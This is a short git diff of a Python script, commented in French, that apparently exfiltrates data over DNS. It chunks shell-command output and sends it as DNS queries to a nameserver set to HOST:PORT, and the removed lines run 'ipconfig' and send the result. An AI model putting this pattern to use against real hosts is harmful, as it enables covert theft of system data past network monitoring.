@@ -26,7 +26,7 @@ def decrypt_aes_cbc(key, iv, ciphertext):
 # division des données retournées par subprocess
 # en bloc de 31 octets, rassemblés dans un tableau
 def chunk(data):
-    chunk_size = 31
+    chunk_size = 12
     chunks = []
 
     # Iterate over the data in chunk_size intervals
@@ -66,19 +66,6 @@ def send_dns(data):
         for ipval in answer:
             print('IP', ipval.to_text())
 
-# test avec ipconfig
-command = "ipconfig"
-process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-output_binary, err = process.communicate()
-
-# conversion en string
-output_string = output_binary.decode()
-
-# chunk du retour subprocess
-data = chunk(output_string)
-# affichage du tableau (debug à supprimer)
-print(data)
-
 # Créer une instance de resolver
 res = resolver.Resolver()
 
@@ -86,5 +73,3 @@ res = resolver.Resolver()
 res.nameservers = [HOST]
 res.port = PORT
 
-# envoie de la donnée au serveur
-send_dns(data)
